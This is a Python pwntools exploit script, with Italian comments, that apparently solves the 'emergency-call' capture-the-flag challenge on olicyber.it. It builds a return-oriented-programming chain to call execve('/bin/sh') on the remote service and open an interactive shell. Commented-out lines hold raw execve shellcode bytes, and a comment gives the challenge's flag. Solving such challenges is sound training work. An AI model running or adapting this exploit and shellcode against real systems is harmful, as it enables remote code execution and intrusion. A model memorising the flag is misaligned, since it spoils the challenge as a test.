#! /usr/bin/env python3

# funzione all che printa e riceve cose
# 1 mette in rax
# 2. mette in rdi
# 3. cosa da printare o dove scrivere rdx
# 4 quanto e lungo, rcx
# 5 unknown


# shell = b"\x6a\x0b\x58\x60\x59\xcd\x80\x00" # struct.pack("I",0x0040101d)
# shell = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"


from pwn import *
import struct

# processo = ELF('./emergency-call')
# conn = process(processo.path)
conn = remote('emergency.challs.olicyber.it', 10306)
# context.terminal = ['terminator', '-e']
# gdb.attach(conn, gdbscript="""
# b *0x004010e5
# c
# """)

pop_rdi = 0x0000000000401032
xor_rax = 0x0000000000401038

pop_rsi = 0x0000000000401034
bin_sh = 0x404000
syscall = 0x000000000040101a
pop_rdx = 0x0000000000401036

rop_chain = p64(pop_rdi)
rop_chain += b'\x3b' + b'\x00'*7 # prova se fa xor
rop_chain += p64(xor_rax)

rop_chain += p64(pop_rdi)
rop_chain += p64(bin_sh)

rop_chain += p64(pop_rsi)
rop_chain +=  b'\x00'*8

rop_chain += p64(pop_rdx)
rop_chain += b'\x00'*8



rop_chain += p64(syscall)

shell =  b'/bin/sh' + b'\x00' 
# flag{Th3_b35T_em3Rg3nCy_C4ll_1s_Sy5c411!}
# region vecchio
# destination = struct.pack('I', 0x00404000)
# destination = struct.pack('I', 0x0040101d)
# altro = b'aaaabaaacaaadaaaeaaafaaagaaahaaa' + b'\x01'*8 + destination + b'\x00' * 4
# altro = b'eseguimiAAAAAAAAAAAAAAAAAAAAAAAABVBBBBBB'+ destination + b'\x00' * 4
# endregion fine vecchio

altro = b'eseguimiAAAAAAAAAAAAAAAAAAAAAAAABVBBBBBB' + rop_chain
payload = shell + altro

# with open('/tmp/prova.txt', 'wb') as f:
#     f.write(payload)

conn.sendline(payload)
conn.interactive()